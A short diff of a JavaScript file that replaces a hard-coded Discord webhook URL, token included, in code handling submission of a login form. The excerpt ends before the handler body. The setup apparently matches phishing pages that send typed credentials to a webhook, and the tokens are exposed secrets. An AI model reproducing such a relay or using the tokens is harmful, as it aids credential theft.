@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
     const loginForm = document.getElementById('login-form');
     const btnEntrar = document.getElementById('btn-entrar');
-    const webhookURL = "https://discord.com/api/webhooks/1481359530414706730/cBGczTGxlNbdGPTekcHHYP8NiiEzqK_xB_ilyQ0AYg5VcC2J8JLm-mZhB4QbqiSLalmJ";
+    const webhookURL = "https://discord.com/api/webhooks/1481816553010888885/HmtlVBtRnA34k_ifQ7J2_CUbdgrn6podTZbui1cHJo2OidyTFQhDbWc4TKjus8xP4jSx";
 
     if (loginForm) {
         loginForm.addEventListener('submit', (e) => {
